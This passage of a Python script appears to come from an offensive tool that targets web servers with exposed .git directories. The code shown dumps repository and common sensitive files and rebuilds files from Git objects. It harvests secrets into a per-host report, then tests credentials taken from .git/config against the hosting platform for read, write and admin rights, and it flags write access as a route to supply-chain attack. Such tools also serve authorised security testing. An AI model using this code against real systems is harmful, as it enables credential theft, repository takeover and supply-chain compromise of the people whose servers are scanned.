                mode = 'a' if os.path.exists(result_file) else 'w'
                with open(result_file, mode, encoding='utf-8') as f:
                    if mode == 'a':
                        f.write("\n\n")
                    
                    f.write("SECRETS FOUND IN SOURCE FILES\n")
                    f.write("-"*70 + "\n")
                    f.write(f"Scanned: {len(files_to_scan)} files\n")
                    f.write(f"Accessible: {accessible_count} files\n")
                    f.write(f"Secrets found: {len(all_secrets)}\n\n")
                    
                    for item in all_secrets:
                        f.write(f"File: {item['file']}\n")
                        f.write(f"Type: {item['type']}\n")
                        f.write(f"Value: {item['value']}\n")
                        f.write("-"*70 + "\n")
                    
                    f.write("\n" + "="*70 + "\n")
                
                print(f"{C.G}[+] Secrets saved to: {result_file}{C.RST}")
            else:
                if accessible_count == 0:
                    print(f"{C.Y}[~] No files were accessible from index{C.RST}")
                    print(f"{C.Y}[~] Files in index cannot be downloaded directly{C.RST}")
                    print(f"{C.Y}[TIP] Try option 6 to check common exposed files instead{C.RST}")
                else:
                    print(f"{C.Y}[~] No secrets found in {accessible_count} accessible files{C.RST}")
            
            input(f"\n{C.DIM}Press Enter to continue...{C.RST}")
        
        elif choice == '5':
            # Show config details
            print(f"\n{C.Y}[*] Re-fetching .git/config...{C.RST}\n")
            config_info = parse_git_config(base_url)
            
            input(f"\n{C.DIM}Press Enter to continue...{C.RST}")
        
        elif choice == '6':
            # Try common files
            found = try_common_files(base_url)
            
            if found:
                # Save results
                result_file = f"{output_dir}/git_dump_{hostname}.txt"
                
                with open(result_file, 'w', encoding='utf-8') as f:
                    f.write(f"Git Repository Secrets Extraction\n")
                    f.write(f"Target: {base_url}\n")
                    f.write(f"Date: {datetime.now()}\n\n")
                    f.write("="*70 + "\n\n")
                    
                    for item in found:
                        f.write(f"FILE: {item['path']}\n")
                        f.write("-"*70 + "\n")
                        f.write(item['content'][:5000])
                        f.write("\n\n")
                        
                        if item['secrets']:
                            f.write("SECRETS FOUND:\n")
                            for secret in item['secrets']:
                                f.write(f"  {secret['type']}: {secret['value']}\n")
                            f.write("\n")
                        
                        f.write("="*70 + "\n\n")
                
                print(f"\n{C.G}[+] Results saved to: {result_file}{C.RST}")
            
            input(f"\n{C.DIM}Press Enter to continue...{C.RST}")
        
        elif choice == '7':
            # Test credential permissions
            if not config_info or not config_info.get('credentials'):
                print(f"\n{C.R}[!] No credentials found to test{C.RST}")
                input(f"\n{C.DIM}Press Enter to continue...{C.RST}")
                continue
            
            print(f"\n{C.Y}[*] Testing credential permissions...{C.RST}\n")
            
            perm_info = test_credential_permissions(config_info)
            
            if perm_info and perm_info.get('no_token'):
                print(f"{C.Y}[~] No token/password found in URL{C.RST}")
                print(f"{C.BOLD}Platform:{C.RST} {perm_info['platform'].upper()}")
                print(f"\n{C.Y}[INFO]{C.RST} This repository likely uses:")
                print(f"  - SSH key authentication")
                print(f"  - OAuth app authentication")
                print(f"  - Username/password stored elsewhere")
                print(f"\n{C.Y}[~] Cannot test permissions without token{C.RST}")
                print(f"{C.Y}[~] However, username is exposed: {config_info['credentials'][0]['username']}{C.RST}")
                
            elif perm_info and perm_info['valid']:
                print(f"{C.G}[+] Credential is VALID!{C.RST}\n")
                print(f"{C.BOLD}Platform:{C.RST} {perm_info['platform'].upper()}")
                
                if perm_info['user_info']:
                    print(f"\n{C.BOLD}Account Info:{C.RST}")
                    for key, value in perm_info['user_info'].items():
                        if value:
                            print(f"  {key}: {value}")
                
                if perm_info['scopes']:
                    print(f"\n{C.BOLD}Token Scopes:{C.RST}")
                    for scope in perm_info['scopes']:
                        print(f"  - {scope}")
                
                print(f"\n{C.BOLD}Permissions:{C.RST}")
                
                if perm_info['can_read']:
                    print(f"  {C.G}✓{C.RST} READ  - Can clone and read repositories")
                else:
                    print(f"  {C.R}✗{C.RST} READ")
                
                if perm_info['can_write']:
                    print(f"  {C.R}✓{C.RST} WRITE - Can push code, modify repos {C.BOLD}[CRITICAL!]{C.RST}")
                else:
                    print(f"  {C.G}✗{C.RST} WRITE")
                
                if perm_info['can_admin']:
                    print(f"  {C.R}✓{C.RST} ADMIN - Can delete repos, manage settings {C.BOLD}[CRITICAL!]{C.RST}")
                else:
                    print(f"  {C.G}✗{C.RST} ADMIN")
                
                print(f"\n{C.BOLD}Risk Assessment:{C.RST}")
                risk_level = ""
                if perm_info['can_admin']:
                    print(f"  {C.R}[CRITICAL]{C.RST} Full admin access - can destroy everything")
                    risk_level = "CRITICAL"
                elif perm_info['can_write']:
                    print(f"  {C.R}[HIGH]{C.RST} Write access - supply chain attack possible")
                    risk_level = "HIGH"
                elif perm_info['can_read']:
                    print(f"  {C.Y}[MEDIUM]{C.RST} Read-only access - data exposure only")
                    risk_level = "MEDIUM"
                else:
                    print(f"  {C.G}[LOW]{C.RST} Limited access")
                    risk_level = "LOW"
                
                # Auto-save permission test results
                result_file = f"{output_dir}/git_dump_{hostname}.txt"
                mode = 'a' if os.path.exists(result_file) else 'w'
                
                with open(result_file, mode, encoding='utf-8') as f:
                    if mode == 'a':
                        f.write("\n\n")
                    
                    f.write("CREDENTIAL PERMISSION TEST RESULTS\n")
                    f.write("-"*70 + "\n")
                    f.write(f"Status: VALID\n")
                    f.write(f"Platform: {perm_info['platform'].upper()}\n\n")
                    
                    if perm_info['user_info']:
                        f.write("Account Info:\n")
                        for key, value in perm_info['user_info'].items():
                            if value:
                                f.write(f"  {key}: {value}\n")
                        f.write("\n")
                    
                    if perm_info['scopes']:
                        f.write("Token Scopes:\n")
                        for scope in perm_info['scopes']:
                            f.write(f"  - {scope}\n")
                        f.write("\n")
                    
                    f.write("Permissions:\n")
                    f.write(f"  READ: {'YES' if perm_info['can_read'] else 'NO'}\n")
                    f.write(f"  WRITE: {'YES' if perm_info['can_write'] else 'NO'}\n")
                    f.write(f"  ADMIN: {'YES' if perm_info['can_admin'] else 'NO'}\n\n")
                    
                    f.write(f"Risk Level: {risk_level}\n")
                    f.write("\n" + "="*70 + "\n")
                
                print(f"\n{C.G}[+] Permission test saved to: {result_file}{C.RST}")
                
            elif perm_info and not perm_info['valid']:
                print(f"{C.R}[!] Credential is INVALID or EXPIRED{C.RST}")
                print(f"{C.Y}[~] Token may have been revoked{C.RST}")
            else:
                print(f"{C.Y}[~] Unable to test credential (unsupported platform or network error){C.RST}")
            
            input(f"\n{C.DIM}Press Enter to continue...{C.RST}")
        
        elif choice == '8':
            # Quick scan - auto-run important checks
            print(f"\n{C.Y}[*] Running quick scan...{C.RST}\n")
            
            # 1. Test credentials if available
            if config_info and config_info.get('credentials'):
                print(f"{C.BOLD}[1/4] Testing credentials...{C.RST}")
                perm_info = test_credential_permissions(config_info)
                if perm_info and perm_info['valid']:
                    print(f"{C.G}✓ Credential is valid - {perm_info['platform'].upper()}{C.RST}")
                    
                    # Auto-save
                    result_file = f"{output_dir}/git_dump_{hostname}.txt"
                    with open(result_file, 'a', encoding='utf-8') as f:
                        f.write("QUICK SCAN - CREDENTIAL TEST\n")
                        f.write("-"*70 + "\n")
                        f.write(f"Status: VALID\n")
                        f.write(f"Platform: {perm_info['platform'].upper()}\n")
                        f.write(f"READ: {'YES' if perm_info['can_read'] else 'NO'}\n")
                        f.write(f"WRITE: {'YES' if perm_info['can_write'] else 'NO'}\n")
                        f.write(f"ADMIN: {'YES' if perm_info['can_admin'] else 'NO'}\n")
                        f.write("\n")
                elif perm_info and perm_info.get('no_token'):
                    print(f"{C.Y}✓ Username found (no token to test){C.RST}")
                else:
                    print(f"{C.R}✗ Credential invalid or expired{C.RST}")
                print()
            
            # 2. Try common sensitive files
            print(f"{C.BOLD}[2/4] Checking common sensitive files...{C.RST}")
            found = try_common_files(base_url)
            if found:
                print(f"{C.G}✓ Found {len(found)} sensitive files{C.RST}\n")
            else:
                print(f"{C.Y}✓ No common files exposed{C.RST}\n")
            
            # 3. Scan for secrets in accessible files
            print(f"{C.BOLD}[3/4] Scanning for secrets...{C.RST}")
            
            # First try common files (since those are usually accessible)
            if found:
                print(f"{C.Y}Checking {len(found)} common files for secrets...{C.RST}")
                secrets_found = []
                
                for item in found:
                    if item.get('secrets'):
                        for secret in item['secrets']:
                            secrets_found.append({
                                'file': item['path'],
                                'type': secret['type'],
                                'value': secret['value']
                            })
                
                if secrets_found:
                    print(f"{C.R}✓ Found {len(secrets_found)} secrets in common files!{C.RST}\n")
                    
                    # Already saved by try_common_files, just note it
                else:
                    print(f"{C.G}✓ No secrets in common files{C.RST}\n")
            else:
                # Try index files if common files didn't work
                if not repo_files:
                    repo_files = parse_git_index(base_url)
                
                if repo_files:
                    # Skip non-secret file types
                    skip_extensions = ['.css', '.js', '.min.js', '.min.css', '.jpg', '.png', '.gif', 
                                      '.svg', '.woff', '.ttf', '.eot', '.ico', '.map', '.md', '.txt', '.html', '.htm']
                    
                    # Filter for likely secret files
                    secret_candidates = [
                        f for f in repo_files 
                        if any(x in f['path'].lower() for x in ['.env', 'config', 'secret', 'credential', 'database', 'password', '.ini', '.conf', '.yml', '.yaml'])
                        and not any(f['path'].lower().endswith(ext) for ext in skip_extensions)
                        and 'template' not in f['path'].lower()  # Skip template directories
                    ][:10]
                    
                    # If no obvious secret files, take first 10 non-CSS/JS files
                    if not secret_candidates:
                        secret_candidates = [
                            f for f in repo_files 
                            if not any(f['path'].lower().endswith(ext) for ext in skip_extensions)
                        ][:10]
                    
                    print(f"{C.Y}Scanning {len(secret_candidates)} index files...{C.RST}")
                    secrets_found = []
                    accessible = 0
                    git_obj_used = 0
                    
                    for file_info in secret_candidates:
                        filepath = file_info['path']
                        sha1 = file_info['sha1']
                        
                        # Try with Git object fallback
                        content = view_file_content(base_url, filepath, sha1)
                        if content:
                            accessible += 1
                            
                            # Check if we used Git object
                            if not view_file_content(base_url, filepath):
                                git_obj_used += 1
                            
                            secrets = search_secrets(content)
                            if secrets:
                                for secret in secrets:
                                    secrets_found.append({
                                        'file': filepath,
                                        'content': content,
                                        **secret
                                    })
                    
                    if secrets_found:
                        print(f"{C.R}✓ Found {len(secrets_found)} secrets!{C.RST}")
                        if git_obj_used > 0:
                            print(f"{C.M}✓ {git_obj_used} files extracted from Git objects{C.RST}\n")
                        else:
                            print()
                        
                        # Auto-save
                        result_file = f"{output_dir}/git_dump_{hostname}.txt"
                        with open(result_file, 'a', encoding='utf-8') as f:
                            f.write("QUICK SCAN - SECRETS FOUND\n")
                            f.write("-"*70 + "\n")
                            for item in secrets_found:
                                f.write(f"File: {item['file']}\n")
                                f.write(f"Type: {item['type']}\n")
                                f.write(f"Value: {item['value']}\n\n")
                            f.write("="*70 + "\n\n")
                    elif accessible > 0:
                        print(f"{C.G}✓ No secrets in {accessible} accessible files{C.RST}\n")
                    else:
                        print(f"{C.Y}✓ No index files accessible{C.RST}\n")
                else:
                    print(f"{C.Y}✓ No files in index{C.RST}\n")
            
            # 4. Summary
            print(f"{C.BOLD}[4/4] Generating summary...{C.RST}")
            result_file = f"{output_dir}/git_dump_{hostname}.txt"
            
            with open(result_file, 'a', encoding='utf-8') as f:
                f.write("QUICK SCAN COMPLETED\n")
                f.write("-"*70 + "\n")
                f.write(f"Scan Date: {datetime.now()}\n")
                f.write(f"Target: {base_url}\n")
                f.write(f"Remote: {config_info['remote_url']}\n")
                
                if config_info.get('credentials'):
                    f.write(f"Credentials: FOUND\n")
                else:
                    f.write(f"Credentials: NOT IN URL\n")
                
                if repo_files:
                    f.write(f"Files in index: {len(repo_files)}\n")
                
                f.write("\n" + "="*70 + "\n")
            
            print(f"{C.G}✓ Quick scan complete!{C.RST}")
            print(f"{C.G}[+] Full report saved to: {result_file}{C.RST}")
            
            input(f"\n{C.DIM}Press Enter to continue...{C.RST}")
        
        else:
            print(f"{C.R}[!] Invalid option{C.RST}")
            input(f"\n{C.DIM}Press Enter to continue...{C.RST}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{C.Y}[*] Interrupted by user{C.RST}\n")
        sys.exit(0)
